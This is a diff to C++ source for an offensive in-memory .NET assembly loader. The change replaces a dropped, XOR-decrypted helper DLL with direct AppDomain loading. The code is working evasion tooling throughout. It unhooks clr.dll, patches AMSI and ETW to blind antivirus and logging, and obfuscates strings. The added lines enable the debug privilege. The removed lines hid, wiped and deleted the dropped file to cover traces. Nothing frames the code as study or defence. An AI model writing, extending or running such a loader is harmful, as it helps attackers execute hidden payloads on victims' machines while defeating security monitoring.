@@ -6,11 +6,20 @@
 #include "amsi.h"
 #include "etw.h"
 #include <cstring>
+#include <objbase.h>
+#include <oleauto.h>
 
 #include <metahost.h>
 #include <mscoree.h>
 
-#include "miniloader_bytes.h"
+#pragma warning(push)
+#pragma warning(disable: 4278 4146 4471)
+#import "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorlib.tlb" \
+    raw_interfaces_only                                    \
+    high_property_prefixes("_get","_put","_putref")        \
+    rename("ReportEvent", "InteropServices_ReportEvent")   \
+    rename("or", "mscorlib_or")
+#pragma warning(pop)
 
 static const GUID CLSID_CLRMetaHost_local =
     { 0x9280188D, 0x0E8E, 0x4867, { 0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE } };
@@ -18,10 +27,10 @@ static const GUID IID_ICLRMetaHost_local =
     { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
 static const GUID IID_ICLRRuntimeInfo_local =
     { 0xBD39D1D2, 0xBA2F, 0x486A, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
-static const GUID CLSID_CLRRuntimeHost_local =
-    { 0x90F1A06E, 0x7712, 0x4762, { 0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02 } };
-static const GUID IID_ICLRRuntimeHost_local =
-    { 0x90F1A06C, 0x7712, 0x4762, { 0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02 } };
+static const GUID CLSID_CorRuntimeHost_local =
+    { 0xCB2F6723, 0xAB3A, 0x11D2, { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
+static const GUID IID_ICorRuntimeHost_local =
+    { 0xCB2F6722, 0xAB3A, 0x11D2, { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
 
 static void unhook_clr_module() {
     HMODULE hClr = nullptr;
@@ -89,10 +98,12 @@ bool execute_assembly(unsigned char* payload, size_t payload_size,
                       const char** args, int argc,
                       const LoaderConfig* config) {
 
+    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
+
     ICLRMetaHost* pMetaHost = nullptr;
     HRESULT hr = g_apis.pCLRCreateInstance(CLSID_CLRMetaHost_local, IID_ICLRMetaHost_local,
         reinterpret_cast<LPVOID*>(&pMetaHost));
-    if (FAILED(hr) || !pMetaHost) return false;
+    if (FAILED(hr) || !pMetaHost) { CoUninitialize(); return false; }
 
     ICLRRuntimeInfo* pRuntimeInfo = nullptr;
     auto version = OBFWSTR(L"v4.0.30319");
@@ -100,159 +111,125 @@ bool execute_assembly(unsigned char* payload, size_t payload_size,
         reinterpret_cast<LPVOID*>(&pRuntimeInfo));
     if (FAILED(hr) || !pRuntimeInfo) {
         pMetaHost->Release();
+        CoUninitialize();
         return false;
     }
 
-    ICLRRuntimeHost* pCLRHost = nullptr;
-    hr = pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost_local,
-        IID_ICLRRuntimeHost_local, reinterpret_cast<LPVOID*>(&pCLRHost));
-    if (FAILED(hr) || !pCLRHost) {
+    ICorRuntimeHost* pCorHost = nullptr;
+    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost_local,
+        IID_ICorRuntimeHost_local, reinterpret_cast<LPVOID*>(&pCorHost));
+    if (FAILED(hr) || !pCorHost) {
         pRuntimeInfo->Release();
         pMetaHost->Release();
+        CoUninitialize();
         return false;
     }
 
-    hr = pCLRHost->Start();
+    hr = pCorHost->Start();
     if (FAILED(hr) && hr != S_FALSE) {
-        pCLRHost->Release();
+        pCorHost->Release();
         pRuntimeInfo->Release();
         pMetaHost->Release();
+        CoUninitialize();
         return false;
     }
 
     Sleep(200 + (GetTickCount() % 800));
 
-    if (!config->no_unhook) {
-        unhook_clr_module();
+    if (g_apis.pRtlAdjustPrivilege) {
+        BOOLEAN prev = FALSE;
+        g_apis.pRtlAdjustPrivilege(20, TRUE, FALSE, &prev);
+        g_apis.pRtlAdjustPrivilege(20, TRUE, TRUE, &prev);
     }
 
+    if (!config->no_unhook) unhook_clr_module();
     if (!config->no_amsi) {
         resolve_phase5_amsi();
         if (g_apis.pAmsiScanBuffer) patch_amsi_bypass();
     }
+    if (!config->no_etw) patch_etw_bypass();
 
-    if (!config->no_etw) {
-        patch_etw_bypass();
+    bool success = false;
+
+    IUnknown* pAppDomainThunk = nullptr;
+    hr = pCorHost->GetDefaultDomain(&pAppDomainThunk);
+    if (SUCCEEDED(hr) && pAppDomainThunk) {
+        mscorlib::_AppDomain* pAppDomain = nullptr;
+        hr = pAppDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain),
+            reinterpret_cast<void**>(&pAppDomain));
+        pAppDomainThunk->Release();
+
+        if (SUCCEEDED(hr) && pAppDomain) {
+            SAFEARRAYBOUND bound = { static_cast<ULONG>(payload_size), 0 };
+            SAFEARRAY* pSA = SafeArrayCreate(VT_UI1, 1, &bound);
+
+            if (pSA) {
+                void* saData = nullptr;
+                SafeArrayAccessData(pSA, &saData);
+                memcpy(saData, payload, payload_size);
+                SafeArrayUnaccessData(pSA);
+
+                mscorlib::_Assembly* pAssembly = nullptr;
+                hr = pAppDomain->Load_3(pSA, &pAssembly);
+                SafeArrayDestroy(pSA);
+
+                if (SUCCEEDED(hr) && pAssembly) {
+                    mscorlib::_MethodInfo* pEntryPoint = nullptr;
+                    hr = pAssembly->get_EntryPoint(&pEntryPoint);
+
+                    if (SUCCEEDED(hr) && pEntryPoint) {
+                        SAFEARRAY* psaArgs = SafeArrayCreateVector(VT_BSTR, 0, argc);
+                        for (int i = 0; i < argc && args; i++) {
+                            int wlen = MultiByteToWideChar(CP_ACP, 0, args[i], -1, nullptr, 0);
+                            wchar_t* warg = new wchar_t[wlen];
+                            MultiByteToWideChar(CP_ACP, 0, args[i], -1, warg, wlen);
+                            BSTR bstr = SysAllocString(warg);
+                            long lIdx = i;
+                            SafeArrayPutElement(psaArgs, &lIdx, bstr);
+                            SysFreeString(bstr);
+                            delete[] warg;
+                        }
+
+                        VARIANT vtStringArgs;
+                        VariantInit(&vtStringArgs);
+                        vtStringArgs.vt = VT_ARRAY | VT_BSTR;
+                        vtStringArgs.parray = psaArgs;
+
+                        SAFEARRAY* psaMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+                        long mIdx = 0;
+                        SafeArrayPutElement(psaMethodArgs, &mIdx, &vtStringArgs);
+
+                        VARIANT vtObj;
+                        VariantInit(&vtObj);
+                        vtObj.vt = VT_NULL;
+
+                        VARIANT vtRet;
+                        VariantInit(&vtRet);
+
+                        hr = pEntryPoint->Invoke_3(vtObj, psaMethodArgs, &vtRet);
+                        success = SUCCEEDED(hr);
+
+                        VariantClear(&vtRet);
+                        SafeArrayDestroy(psaMethodArgs);
+                        SafeArrayDestroy(psaArgs);
+
+                        pEntryPoint->Release();
+                    }
+                    pAssembly->Release();
+                }
+            }
+            pAppDomain->Release();
+        }
     }
-
-    char mmfName[64] = {};
-    auto mmfFmt = OBFSTR("Local\\SM0-%lu-%lu");
-    snprintf(mmfName, sizeof(mmfName), mmfFmt.c_str(),
-        GetCurrentProcessId(), GetTickCount());
-
-    HANDLE hMapFile = CreateFileMappingA(INVALID_HANDLE_VALUE, nullptr,
-        PAGE_READWRITE, 0, static_cast<DWORD>(payload_size), mmfName);
-    if (!hMapFile) {
-        pCLRHost->Release();
-        pRuntimeInfo->Release();
-        pMetaHost->Release();
-        return false;
-    }
-
-    void* pBuf = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, payload_size);
-    if (!pBuf) {
-        CloseHandle(hMapFile);
-        pCLRHost->Release();
-        pRuntimeInfo->Release();
-        pMetaHost->Release();
-        return false;
-    }
-    memcpy(pBuf, payload, payload_size);
-
-    wchar_t loaderPath[MAX_PATH] = {};
-    DWORD tick = GetTickCount();
-    wchar_t loaderName[64] = {};
-    swprintf_s(loaderName, L"msil_cfg_%08x.dll", tick);
-
-    wchar_t pdDir[MAX_PATH] = {};
-    if (GetEnvironmentVariableW(L"ProgramData", pdDir, MAX_PATH) > 0) {
-        swprintf_s(loaderPath, L"%ls\\Microsoft\\Crypto\\%ls", pdDir, loaderName);
-    }
-
-    HANDLE hLoader = INVALID_HANDLE_VALUE;
-    if (loaderPath[0]) {
-        hLoader = CreateFileW(loaderPath, GENERIC_WRITE, 0, nullptr,
-            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN, nullptr);
-    }
-
-    if (hLoader == INVALID_HANDLE_VALUE) {
-        wchar_t exePath[MAX_PATH] = {};
-        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
-        wchar_t* lastSlash = wcsrchr(exePath, L'\\');
-        if (lastSlash) *(lastSlash + 1) = L'\0';
-        swprintf_s(loaderPath, L"%ls%ls", exePath, loaderName);
-        hLoader = CreateFileW(loaderPath, GENERIC_WRITE, 0, nullptr,
-            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    }
-
-    if (hLoader == INVALID_HANDLE_VALUE) {
-        wchar_t tempDir[MAX_PATH] = {};
-        GetTempPathW(MAX_PATH, tempDir);
-        swprintf_s(loaderPath, L"%ls%ls", tempDir, loaderName);
-        hLoader = CreateFileW(loaderPath, GENERIC_WRITE, 0, nullptr,
-            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    }
-    if (hLoader == INVALID_HANDLE_VALUE) {
-        UnmapViewOfFile(pBuf);
-        CloseHandle(hMapFile);
-        pCLRHost->Release();
-        pRuntimeInfo->Release();
-        pMetaHost->Release();
-        return false;
-    }
-
-    unsigned char* decrypted_dll = new unsigned char[g_miniloader_dll_size];
-    decrypt_miniloader(decrypted_dll, g_miniloader_dll_xor, g_miniloader_dll_size);
-
-    DWORD written = 0;
-    WriteFile(hLoader, decrypted_dll, g_miniloader_dll_size, &written, nullptr);
-    CloseHandle(hLoader);
-
-    volatile unsigned char* vd = reinterpret_cast<volatile unsigned char*>(decrypted_dll);
-    for (unsigned int i = 0; i < g_miniloader_dll_size; i++) vd[i] = 0;
-    delete[] decrypted_dll;
-
-    char argBuf[4096] = {};
-    int pos = snprintf(argBuf, sizeof(argBuf), "%s|%zu", mmfName, payload_size);
-    for (int i = 0; i < argc && pos < (int)sizeof(argBuf) - 256; i++) {
-        pos += snprintf(argBuf + pos, sizeof(argBuf) - pos, "|%s", args[i]);
-    }
-
-    wchar_t wArgBuf[4096] = {};
-    MultiByteToWideChar(CP_ACP, 0, argBuf, -1, wArgBuf, 4096);
-
-    auto typeName = OBFWSTR(L"Loader");
-    auto methodName = OBFWSTR(L"Execute");
-
-    DWORD retVal = 0;
-    hr = pCLRHost->ExecuteInDefaultAppDomain(loaderPath,
-        typeName.c_str(), methodName.c_str(), wArgBuf, &retVal);
 
     if (!config->no_amsi) restore_amsi_bypass();
     if (!config->no_etw) restore_etw_bypass();
 
-    pCLRHost->Stop();
-    pCLRHost->Release();
+    pCorHost->Stop();
+    pCorHost->Release();
     pRuntimeInfo->Release();
     pMetaHost->Release();
-    UnmapViewOfFile(pBuf);
-    CloseHandle(hMapFile);
+    CoUninitialize();
 
-    bool deleted = false;
-    for (int d = 0; d < 20; d++) {
-        if (DeleteFileW(loaderPath)) { deleted = true; break; }
-        Sleep(250);
-    }
-    if (!deleted) {
-        HANDLE hZ = CreateFileW(loaderPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
-            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hZ != INVALID_HANDLE_VALUE) {
-            SetFilePointer(hZ, 0, nullptr, FILE_BEGIN);
-            SetEndOfFile(hZ);
-            CloseHandle(hZ);
-        }
-        MoveFileExW(loaderPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
-    }
-
-    return SUCCEEDED(hr) && retVal == 0;
+    return success;
 }
